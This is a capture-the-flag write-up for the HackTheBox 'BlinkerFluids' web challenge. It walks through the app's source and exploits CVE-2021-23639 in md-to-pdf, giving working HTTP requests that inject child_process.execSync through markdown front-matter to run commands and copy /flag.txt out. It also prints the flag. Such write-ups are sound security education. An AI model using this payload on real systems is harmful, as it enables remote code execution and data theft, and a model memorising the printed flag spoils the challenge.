---
Category: Web
Difficulty: Easy
Platform:
 - "HackTheBox"
 - "Cyber Apocalypse 2022"
Retired: true
Status: 3. Complete
Tags: CVE-2021-23639, RCE, md-to-pdf
---
>[!quote]
> *Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?*


# Set up

- **Dockerfile**
    
    ```bash
    FROM node:current-buster-slim
    
    # Install packages
    RUN apt-get update \
        && apt-get install -y wget curl supervisor gnupg \
        && wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - \
        && sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list' \
        && apt-get update \
        && apt-get install -y google-chrome-stable fonts-ipafont-gothic fonts-wqy-zenhei fonts-thai-tlwg fonts-kacst fonts-freefont-ttf libxss1 libxshmfence-dev \
        --no-install-recommends \
        && rm -rf /var/lib/apt/lists/*
    
    # Setup challenge directory
    RUN mkdir -p /app
    
    # Add flag
    COPY flag.txt /flag.txt
    
    # Add application
    WORKDIR /app
    COPY challenge .
    RUN chown -R www-data:www-data .
    
    # Install dependencies
    RUN npm install --production
    
    # Setup superivsord
    COPY config/supervisord.conf /etc/supervisord.conf
    
    # Expose the port node-js is reachable on
    EXPOSE 1337
    
    # Start the node-js application
    CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
    ```
    
- **build-docker.sh**
    
    ```bash
    #!/bin/bash
    docker rm -f web_blinkerfluids
    docker build -t web_blinkerfluids .
    docker run --name=web_blinkerfluids --rm -p1337:1337 -it web_blinkerfluids
    ```
    
- **package.json**
    
    ```json
    {
    	"name": "blinker-fluids",
    	"version": "1.0.0",
    	"description": "",
    	"main": "index.js",
    	"scripts": {
    		"start": "node index.js"
    	},
    	"keywords": [],
    	"author": "rayhan0x01",
    	"license": "ISC",
    	"dependencies": {
    		"express": "4.17.3",
    		"md-to-pdf": "4.1.0",
    		"nunjucks": "3.2.3",
    		"sqlite-async": "1.1.3",
    		"uuid": "8.3.2"
    	},
    	"devDependencies": {
    		"nodemon": "^1.19.1"
    	}
    }
    ```
    

# Information Gathering

## Source code

- **index.js**
    
    ```jsx
    const express      = require('express');
    const app          = express();
    const path         = require('path');
    const nunjucks     = require('nunjucks');
    const routes       = require('./routes/index.js');
    const Database     = require('./database');
    
    const db = new Database('invoice.db');
    
    app.use(express.json());
    app.disable('etag');
    
    nunjucks.configure('views', {
    	autoescape: true,
    	express: app
    });
    
    app.set('views', './views');
    app.use('/static', express.static(path.resolve('static')));
    
    app.use(routes(db));
    
    app.all('*', (req, res) => {
    	return res.status(404).send({
    		message: '404 page not found'
    	});
    });
    
    (async () => {
    	await db.connect();
    	await db.migrate();
    	app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
    })();
    ```
    
- **database.js**
    
    ```jsx
    const sqlite = require('sqlite-async');
    
    class Database {
        constructor(db_file) {
            this.db_file = db_file;
            this.db = undefined;
        }
    
        async connect() {
            this.db = await sqlite.open(this.db_file);
        }
    
        async migrate() {
            return this.db.exec(`
                DROP TABLE IF EXISTS invoices;
    
                CREATE TABLE invoices (
                    id           INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,
                    invoice_id   VARCHAR(255) NOT NULL,
                    created      VARCHAR(255) DEFAULT CURRENT_TIMESTAMP
                );
    
                INSERT INTO invoices (invoice_id) VALUES ('f0daa85f-b9de-4b78-beff-2f86e242d6ac');
            `);
        }
        async listInvoices() {
            return new Promise(async (resolve, reject) => {
                try {
                    let stmt = await this.db.prepare('SELECT * FROM invoices order by id desc');
                    resolve(await stmt.all());
                } catch(e) {
                    reject(e);
                }
            });
        }
        async getInvoice(id) {
            return new Promise(async (resolve, reject) => {
                try {
                    let stmt = await this.db.prepare('SELECT * FROM invoices WHERE invoice_id = ?');
                    resolve(await stmt.get(id));
                } catch(e) {
                    reject(e);
                }
            });
        }
    
        async addInvoice(id) {
            return new Promise(async (resolve, reject) => {
                try {
                    let stmt = await this.db.prepare('INSERT INTO invoices (invoice_id) VALUES( ? )');
                    resolve(await stmt.run(id));
                } catch(e) {
                    reject(e);
                }
            });
        }
        async deleteInvoice(id) {
            return new Promise(async (resolve, reject) => {
                try {
                    let stmt = await this.db.prepare('DELETE FROM invoices WHERE invoice_id = ?');
                    resolve(await stmt.run(id));
                } catch(e) {
                    reject(e);
                }
            });
        }
    }
    
    module.exports = Database;
    ```
    
- **routes/index.js**
    
    ```jsx
    const express        = require('express');
    const router         = express.Router();
    const MDHelper       = require('../helpers/MDHelper.js');
    
    let db;
    
    const response = data => ({ message: data });
    
    router.get('/', async (req, res) => {
        return res.render('index.html');
    });
    
    router.get('/api/invoice/list', async (req, res) => {
    	return db.listInvoices()
    		.then(invoices => {
    			res.json(invoices);
    		})
    		.catch(e => {
    			res.status(500).send(response('Something went wrong!'));
    		})
    });
    
    router.post('/api/invoice/add', async (req, res) => {
        const { markdown_content } = req.body;
    
        if (markdown_content) {
            return MDHelper.makePDF(markdown_content)
                .then(id => {
                    db.addInvoice(id)
    					.then(() => {
    						res.send(response('Invoice saved successfully!'));
    					})
    					.catch(e => {
    						res.send(response('Something went wrong!'));
    					})
                })
                .catch(e => {
                    console.log(e);
                    return res.status(500).send(response('Something went wrong!'));
                })
        }
        return res.status(401).send(response('Missing required parameters!'));
    });
    
    router.post('/api/invoice/delete', async (req, res) => {
    	const { invoice_id } = req.body;
    
    	if (invoice_id) {
    		return db.deleteInvoice(invoice_id)
    		.then(() => {
    			res.send(response('Invoice removed successfully!'))
    		})
    		.catch(e => {
    			res.status(500).send(response('Something went wrong!'));
    		})
    	}
    
    	return res.status(401).send(response('Missing required parameters!'));
    });
    
    module.exports = database => {
        db = database;
        return router;
    };
    ```
    
- **helpers/MDHelpers.js**
    
    ```jsx
    const { mdToPdf }    = require('md-to-pdf')
    const { v4: uuidv4 } = require('uuid')
    
    const makePDF = async (markdown) => {
        return new Promise(async (resolve, reject) => {
            id = uuidv4();
            try {
                await mdToPdf(
                    { content: markdown },
                    {
                        dest: `static/invoices/${id}.pdf`,
                        launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
                    }
                );
                resolve(id);
            } catch (e) {
                reject(e);
            }
        });
    }
    
    module.exports = {
        makePDF
    };
    ```
    

## Screenshots

Browsed the home page:

![Untitled](../../zzz_res/attachments/BlinkerFluids%20ad540f0383064a95a2a48a7a2c82b715.png)

Generated a pdf from  markdown file:

![Untitled](../../zzz_res/attachments/BlinkerFluids%20ad540f0383064a95a2a48a7a2c82b715%201.png)

# The Bug

## md-2-pdf Remote Code Execution

[Remote Code Execution (RCE) in md-to-pdf | CVE-2021-23639 | Snyk](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)

```http
POST /api/invoice/add HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 98
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"markdown_content":"---js\n((require('child_process')).execSync('id > /tmp/test.txt'))\n---RCE "}
```

```bash
# ls /tmp/
test.txt  v8-compile-cache-0
# cat /tmp/test.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Exploitation

```http
POST /api/invoice/add HTTP/1.1
Host: 165.22.125.212:32182
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 124
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"markdown_content":"---js\n((require('child_process')).execSync('cat /flag.txt > /app/static/invoices/flag.txt'))\n---RCE"}
```

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://165.22.125.212:32182/static/invoices/flag.txt
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
```

# Flag

>[!success]
>`HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`

